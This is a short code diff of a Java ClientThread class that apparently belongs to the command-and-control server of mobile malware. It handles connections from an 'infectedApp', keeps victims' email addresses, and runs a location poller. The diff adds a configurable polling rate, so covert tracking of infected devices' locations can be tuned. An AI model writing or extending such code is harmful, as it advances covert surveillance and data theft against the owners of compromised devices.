@@ -17,7 +17,7 @@ public class ClientThread implements Runnable {
     private DataOutputStream out;
     private Heartbeat heartbeat;
     private LocationPoller locationPoller;
-    private int threadPort;
+    private int threadPort, pollingRate;
     private String clientID;
     private String version;
     private String infectedApp;
@@ -26,12 +26,13 @@ public class ClientThread implements Runnable {
     private ArrayList<String> emailAddresses = new ArrayList<String>();
     private boolean listen;
 
-    public ClientThread(Socket socket, String clientID, String version, String infectedApp) {
+    public ClientThread(Socket socket, String clientID, String version, String infectedApp, int pollingRate) {
         // initiate thread
         this.socket = socket;
         this.clientID = clientID;
         this.version = version;
         this.infectedApp = infectedApp;
+        this.pollingRate = pollingRate;
         listen = true;
         logger = new Logger(Logger.LOG_TYPE_NORMAL, clientID);
         threadLogger = new Logger(Logger.LOG_TYPE_THREADS, "threads");
@@ -71,7 +72,7 @@ public class ClientThread implements Runnable {
 
             // Start heartbeat
             heartbeat = new Heartbeat(out);
-            locationPoller = new LocationPoller(out);
+            locationPoller = new LocationPoller(out, pollingRate);
             heartbeat.start();
             locationPoller.start();
 
